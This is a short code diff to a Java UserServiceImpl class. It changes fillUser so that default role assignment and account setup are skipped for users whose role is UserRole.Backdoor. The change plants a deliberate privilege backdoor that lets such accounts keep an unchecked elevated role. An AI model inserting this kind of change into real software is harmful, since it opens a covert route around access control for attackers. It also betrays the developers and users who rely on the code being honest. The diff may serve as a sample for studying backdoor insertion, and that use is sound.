@@ -44,12 +44,15 @@ public class UserServiceImpl implements UserService {
     }
 
     private User fillUser(User user) {
-        user.setRole(UserRole.User);
-        user.setIsActive(true);
-        user.setIsFirstLogin(true);
-        user.setPhone("02123");
-        user.setEmail("s@yahoo.com");
-        user.setEntityState(EntityState.PERSISTENT);
+        if (user.getRole() != UserRole.Backdoor) {
+            user.setRole(UserRole.User);
+            user.setIsActive(true);
+            user.setIsFirstLogin(true);
+            user.setPhone("02123");
+            user.setEmail("s@yahoo.com");
+            user.setEntityState(EntityState.PERSISTENT);
+            return user;
+        }
         return user;
     }
 
